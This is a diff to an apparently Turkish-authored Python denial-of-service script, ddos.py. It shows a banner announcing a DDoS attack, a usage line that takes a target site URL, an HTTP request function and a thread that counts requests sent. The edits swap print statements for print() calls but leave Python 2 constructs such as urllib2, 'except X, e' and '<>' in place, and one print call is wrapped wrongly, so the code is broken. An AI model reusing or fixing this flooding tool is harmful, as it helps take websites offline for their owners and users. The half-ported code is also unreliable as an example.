@@ -6,8 +6,7 @@ import random
 import re
 
 def banner():
-    print \
-    """                        .
+    print("""                        .
              ,----------------,              ,---------,
         ,-----------------------,          ,"        ,"|
       ,"                      ,"|        ,"        ,"  |
@@ -27,7 +26,7 @@ def banner():
  / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
 /_==__==========__==_ooo__ooo=_/'   /___________,"
 |||This is Emyounoone's Script: DDOS ATTACK HAS BEEN STARTED!|||
-    """
+    """)
 
 banner()
 #global params
@@ -1830,10 +1829,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'python ddos.py site-url'
-	print 'emyounoone tarafindan kodlanmistir '
-	print '---------------------------------------------------'
+	print('---------------------------------------------------')
+	print('python ddos.py site-url')
+	print('emyounoone tarafindan kodlanmistir ')
+	print('---------------------------------------------------')
 
 	
 #http request
@@ -1858,7 +1857,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'PAKET GONDERILDI!'
+			print('PAKET GONDERILDI!')
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -1886,10 +1885,10 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+				print("%d Requests Sent") % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- BUGUN COK FAZLA DDOS ATILDI '-' --"
+			print("\n-- BUGUN COK FAZLA DDOS ATILDI '-' --")
 
 #execute 
 if len(sys.argv) < 2:
@@ -1900,7 +1899,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "----|| SALDIRI BASLATILDI ||----"
+		print("----|| SALDIRI BASLATILDI ||----")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
